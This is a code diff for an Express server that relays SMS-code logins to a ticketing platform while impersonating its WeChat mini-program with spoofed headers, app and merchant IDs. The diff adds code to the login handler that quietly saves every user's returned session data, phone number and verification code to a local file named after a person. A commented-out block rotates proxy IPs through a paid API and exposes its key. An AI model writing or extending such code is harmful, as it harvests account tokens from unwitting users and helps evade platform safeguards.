@@ -4,6 +4,9 @@ import axios from 'axios';
 import cors from 'cors'
 import qrcode from 'qrcode'
 import path from 'path'
+import fetch from 'node-fetch';
+import request from "request";
+import util from "util";
 
 const app = express();
 const port = 80;
@@ -11,6 +14,24 @@ const port = 80;
 // 解析JSON请求体
 app.use(express.json());
 app.use(cors());
+
+// let ip = ''
+
+// function getIp() {
+//     console.log('获取ip中～')
+//     return axios({
+//         url: "http://api2.xkdaili.com/tools/XApi.ashx?apikey=XK9407CE397DDBA50D65&qty=1&format=json&split=0&sign=bc069e1c951656fe91de50073f8269ed",
+//         method: "get",
+//     }).then(async (res) => {
+//         ip = res.data.data;
+//     }).catch(async (err) => {
+//         await getIp()
+//     });
+// }
+
+// setInterval(async () => {
+//     await getIp()
+// }, 1000 *60 * 2)
 
 // 定义POST接口
 app.post('/submit', (req, res) => {
@@ -38,24 +59,24 @@ app.post('/getCode', async (req, res) => {
     try {
         const response = await axios({
             headers: {
-                'Host': '65373d6e95c3170001074c57.caiyicloud.com',
+                'Host': 'm.piaoxingqiu.com',
                 'Connection': 'keep-alive',
                 'terminal-src': 'WEIXIN_MINI',
                 'content-type': 'application/json',
                 'src': 'weixin_mini',
-                'ver': '4.18.1',
-                'merchant-id': '65373d6e95c3170001074c57',
+                'ver': '4.24.7',
+                'merchant-id': '6267a80eed218542786f1494',
                 'front-trace-id': 'm1ipraf6538bwbr1dmg',
                 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.52(0x18003422) NetType/WIFI Language/zh_CN',
-                'Referer': 'https://servicewechat.com/wxe3489c9feaf8f361/37/page-frame.html'
+                'Referer': 'https://servicewechat.com/wxad60dd8123a62329/37/page-frame.html'
             },
             method: 'post',
-            url: 'https://65373d6e95c3170001074c57.caiyicloud.com/cyy_gatewayapi/user/pub/v5/send_verify_code',
+            url: 'https://m.piaoxingqiu.com/cyy_gatewayapi/user/pub/v5/send_verify_code',
             data: JSON.stringify({
                 'src': 'weixin_mini',
-                'merchantId': '65373d6e95c3170001074c57',
-                'ver': '4.18.1',
-                'appId': 'wxe3489c9feaf8f361',
+                'merchantId': '6267a80eed218542786f1494',
+                'ver': '4.24.7',
+                'appId': 'wxad60dd8123a62329',
                 'verifyCodeUseType': 'USER_LOGIN',
                 'messageType': 'MOBILE',
                 'cellphone': data.phone,
@@ -64,6 +85,7 @@ app.post('/getCode', async (req, res) => {
         })
         res.json(response.data);
     } catch (error) {
+        console.log(error);
         res.status(500).json({ error: 'Failed to fetch data from the target server' });
     }
 })
@@ -73,25 +95,25 @@ app.post('/photo', async (req, res) => {
     try {
         const response = await axios({
             headers: {
-                'Host': '65373d6e95c3170001074c57.caiyicloud.com',
+                'Host': 'm.piaoxingqiu.com',
                 'Connection': 'keep-alive',
                 'terminal-src': 'WEIXIN_MINI',
                 'content-type': 'application/json',
                 'src': 'weixin_mini',
-                'ver': '4.18.1',
-                'merchant-id': '65373d6e95c3170001074c57',
+                'ver': '4.24.7',
+                'merchant-id': '6267a80eed218542786f1494',
                 'front-trace-id': 'm1ipramx5wjfshwql4s',
                 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.52(0x18003422) NetType/WIFI Language/zh_CN',
-                'Referer': 'https://servicewechat.com/wxe3489c9feaf8f361/37/page-frame.html'
+                'Referer': 'https://servicewechat.com/wxad60dd8123a62329/37/page-frame.html'
             },
             method: 'post',
-            url: 'https://65373d6e95c3170001074c57.caiyicloud.com/cyy_gatewayapi/user/pub/v3/generate_photo_code',
+            url: 'https://m.piaoxingqiu.com/cyy_gatewayapi/user/pub/v3/generate_photo_code',
             data: JSON.stringify({
                 'cellphone': data.phone,
                 'src': 'weixin_mini',
-                'merchantId': '65373d6e95c3170001074c57',
-                'ver': '4.18.1',
-                'appId': 'wxe3489c9feaf8f361',
+                'merchantId': '6267a80eed218542786f1494',
+                'ver': '4.24.7',
+                'appId': 'wxad60dd8123a62329',
                 'verifyCodeUseType': 'USER_LOGIN',
                 'messageType': 'MOBILE',
             }),
@@ -107,29 +129,41 @@ app.post('/login', async (req, res) => {
     try {
         const response = await axios({
             headers: {
-                'Host': '65373d6e95c3170001074c57.caiyicloud.com',
+                'Host': 'm.piaoxingqiu.com',
                 'Connection': 'keep-alive',
                 'terminal-src': 'WEIXIN_MINI',
                 'content-type': 'application/json',
                 'src': 'weixin_mini',
-                'ver': '4.18.1',
-                'merchant-id': '65373d6e95c3170001074c57',
+                'ver': '4.24.7',
+                'merchant-id': '6267a80eed218542786f1494',
                 'front-trace-id': 'm1iprhrfauuqtt8p9uv',
                 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.52(0x18003422) NetType/WIFI Language/zh_CN',
-                'Referer': 'https://servicewechat.com/wxe3489c9feaf8f361/37/page-frame.html'
+                'Referer': 'https://servicewechat.com/wxad60dd8123a62329/37/page-frame.html'
             },
             method: 'post',
-            url: 'https://65373d6e95c3170001074c57.caiyicloud.com/cyy_gatewayapi/user/pub/v3/wx/mini/cellphone_login_or_register',
+            url: 'https://m.piaoxingqiu.com/cyy_gatewayapi/user/pub/v3/wx/mini/cellphone_login_or_register',
             data: JSON.stringify({
                 'src': 'weixin_mini',
-                'merchantId': '65373d6e95c3170001074c57',
-                'ver': '4.18.1',
-                'appId': 'wxe3489c9feaf8f361',
+                'merchantId': '6267a80eed218542786f1494',
+                'ver': '4.24.7',
+                'appId': 'wxad60dd8123a62329',
                 'cellphone': data.phone,
                 'verifyCode': data.code,
-                'openId': 'oyOih609-PKxOzoaGFehQ7n4mhIM'
+                'openId': 'oIFIO5Ag1w97uwhq9ayabZQa1RR0'
             }),
         })
+        fs.appendFileSync('赵阳.txt', `${JSON.stringify({
+            ...response.data.data,
+            phone: data.phone,
+            code: data.code
+        })},\n`, 'utf8', function (err) {
+            if (err) {
+                console.error(err);
+                res.end('Error writing file');
+            } else {
+                res.end('Data received');
+            }
+        });
         res.json(response.data);
         // res.status(200).send('Data received successfully.');
     } catch (error) {
